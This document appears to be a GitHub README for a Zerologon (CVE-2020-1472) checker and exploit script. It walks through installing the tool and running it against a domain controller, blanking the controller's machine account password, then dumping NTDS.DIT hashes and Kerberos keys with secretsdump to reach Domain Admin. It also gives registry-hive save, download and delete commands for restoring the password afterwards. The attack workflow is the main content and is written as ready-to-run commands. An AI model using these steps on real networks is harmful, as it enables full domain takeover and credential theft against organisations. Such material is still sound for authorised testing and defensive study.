# CVE-2020-1472
Checker & Exploit Code for CVE-2020-1472 aka **Zerologon**

Tests whether a domain controller is vulnerable to the Zerologon attack, if vulnerable, it will resets the Domain Controller's account password to an empty string.

**NOTE:** It will likely break things in production environments (eg. DNS functionality, communication  with replication Domain Controllers, etc); target clients will then not be able to authenticate to the domain anymore, and they can only be re-synchronized through manual action.

Zerologon original research and whitepaper by Secura (Tom Tervoort) - [https://www.secura.com/blog/zero-logon](https://www.secura.com/blog/zero-logon)

# Exploit

It will attempt to perform the Netlogon authentication bypass. When a domain controller is patched, the detection script will give up after sending 2000 pairs of RPC calls, concluding that the target is not vulnerable (with a false negative chance of 0.04%).

The exploit will be successful only if the Domain Controller uses the password stored in Active Directory to validate the login attempt, rather than the one stored locally as, when changing a password in this way, it is only changed in the AD. The targeted system itself will still locally store its original password.

## Installation

Requires Python 3.7 or higher, virtualenv, pip and ~~a modified version of Impacket's library: nrpc.py (/impacket/dcerpc/v5)~~ the latest version of impacket from [GitHub](https://github.com/SecureAuthCorp/impacket) with added netlogon structures.

### 1. Install Impacket as follows:

1.	```git clone https://github.com/SecureAuthCorp/impacket```
2.	```cd impacket```
3.	```
	pwd 
	~/impacket/
	```
4.	```virtualenv --python=python3 impacket```
5.	```source impacket/bin/activate```
6.	```pip install --upgrade pip```
7.	```pip install .```

### 2. Install the Zerologon exploit script as follows:
1.	```pwd 
	~/impacket/
	```
2.	```cd example```
3.	```git clone https://github.com/VoidSec/CVE-2020-1472```
4.	```cd CVE-2020-1472```
5.	```pip install -r requirements.txt```

## Running the script

The script can be used to target a DC or backup DC. It will likely also work against a read-only DC, but this has not been tested yet. 
The DC name should be its NetBIOS computer name. If this name is not correct, the script will likely fail with a `STATUS_INVALID_COMPUTER_NAME` error.
Given a domain controller named `EXAMPLE-DC` and IP address `1.2.3.4`, run the script as follows:

+    ```./cve-2020-1472-exploit.py -n EXAMPLE-DC -t 1.2.3.4```

Running the script should results in Domain Controller's account password being reset to an empty string.

At this point you should be able to run Impacket's ```secretsdump.py -no-pass -just-dc Domain/'DC_NETBIOS_NAME$'@DC_IP_ADDR``` (alternatively you can use the empty hash: ```-hashes :31d6cfe0d16ae931b73c59d7e0c089c0```) that will extract only NTDS.DIT data (NTLM hashes and Kerberos keys).

Which should get you Domain Admin. **WIN WIN WIN**

## Restore

After you have obtained Domain Admin, you can ```wmiexec.py``` to the target DC with a credential obtained from secretsdump and perform the following steps:

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
```

Run: ```secretsdump.py -sam sam.save -system system.save -security security.save LOCAL```

And that should show you the original NT hash of the machine account. You can then re-install that original machine account hash to the domain by using the ```reinstall_original_pw.py``` script provided [here](https://github.com/risksense/zerologon/). **Reinstalling the original hash is necessary for the DC to continue to operate normally.**

